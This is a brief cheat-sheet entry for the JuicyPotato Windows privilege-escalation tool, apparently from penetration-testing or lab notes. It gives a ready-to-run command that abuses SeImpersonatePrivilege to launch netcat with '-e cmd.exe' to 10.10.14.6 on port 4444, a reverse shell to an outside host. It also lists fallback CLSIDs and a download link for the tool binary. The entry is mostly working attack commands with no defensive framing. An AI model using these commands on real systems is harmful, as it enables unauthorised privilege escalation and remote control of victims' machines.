# Name
JuicyPotato

## Usage
```
#Does not work on Win10 version >= 1809, Serverr2019
#SeImpersonatePrivilege is enabled 

juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\kohsuke\Desktop\nc32.exe -e cmd.exe 10.10.14.6 4444" -t *

#Can add the following if not working
-c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
-c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

## Source
https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
